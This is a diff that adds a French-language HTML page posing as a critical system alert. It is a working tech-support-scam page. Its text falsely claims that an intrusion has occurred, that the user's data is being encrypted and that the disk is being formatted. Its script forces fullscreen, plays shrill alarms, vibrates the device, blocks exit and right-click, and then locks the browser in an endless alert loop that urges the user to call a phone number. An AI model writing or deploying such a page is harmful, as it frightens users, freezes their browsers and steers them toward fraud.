@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>⚠️ ALERTE SYSTÈME CRITIQUE ⚠️</title>
+    <style>
+        body { background: #600; color: white; font-family: sans-serif; text-align: center; margin: 0; overflow: hidden; cursor: none; }
+        #overlay { height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
+        .blink { animation: blinker 0.2s linear infinite; }
+        @keyframes blinker { 50% { opacity: 0; } }
+        h1 { font-size: 5vw; text-shadow: 4px 4px black; }
+        .warning { background: white; color: red; padding: 10px; font-weight: bold; border-radius: 10px; }
+    </style>
+</head>
+<body onclick="lockAndScream()">
+
+    <div id="overlay">
+        <h1 class="blink">☢️ INTRUSION DÉTECTÉE ☢️</h1>
+        <div class="warning">TOUTES VOS DONNÉES SONT EN COURS DE CHIFFRAGE</div>
+        <p style="font-size: 1.5em;">Tentative de formatage du disque : <b>C:/WINDOWS/SYSTEM32</b></p>
+        <div id="status" style="font-family: monospace; background: black; padding: 20px; width: 80%; text-align: left;">
+            > Initialisation de l'exploit... OK<br>
+            > Accès root... OK<br>
+            > Suppression des sauvegardes Cloud... EN COURS
+        </div>
+        <h2>NE PAS ÉTEINDRE L'APPAREIL</h2>
+    </div>
+
+    <script>
+        let isActive = false;
+
+        function lockAndScream() {
+            // 1. Forcer le plein écran à chaque clic
+            const doc = document.documentElement;
+            if (doc.requestFullscreen) doc.requestFullscreen();
+            
+            if(isActive) return;
+            isActive = true;
+
+            // 2. ALARMES STRIDENTES (Fréquences croisées)
+            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            
+            function createAlarm(freq, type) {
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                osc.type = type;
+                osc.frequency.setValueAtTime(freq, audioCtx.currentTime);
+                osc.connect(gain);
+                gain.connect(audioCtx.destination);
+                osc.start();
+                
+                // Effet de sirène qui monte et descend
+                setInterval(() => {
+                    osc.frequency.exponentialRampToValueAtTime(freq * 1.5, audioCtx.currentTime + 0.5);
+                    osc.frequency.exponentialRampToValueAtTime(freq, audioCtx.currentTime + 1);
+                }, 1000);
+            }
+
+            createAlarm(800, 'sawtooth'); // Alarme 1 (agressive)
+            createAlarm(1200, 'sine');    // Alarme 2 (perçante)
+
+            // 3. Vibration "Surchauffe"
+            if(navigator.vibrate) {
+                setInterval(() => { navigator.vibrate([500, 100, 500]); }, 600);
+            }
+
+            // 4. Empêcher de quitter (Alerte de sortie)
+            window.onbeforeunload = function() {
+                return "Le formatage de votre disque dur sera irréversible si vous quittez !";
+            };
+
+            // 5. BLOCAGE FINAL (Alertes en boucle)
+            // On attend 5 secondes pour laisser la panique monter avant de bloquer le navigateur
+            setTimeout(() => {
+                while(true) {
+                    alert("⚠️ ALERTE : VOTRE SYSTÈME EST CORROMPU. CONTACTEZ LE SUPPORT EDIA AU 06 34 48 42 96 ⚠️");
+                }
+            }, 5000);
+        }
+
+        // Bloquer le clic droit
+        document.addEventListener('contextmenu', event => event.preventDefault());
+    </script>
+</body>
+</html>
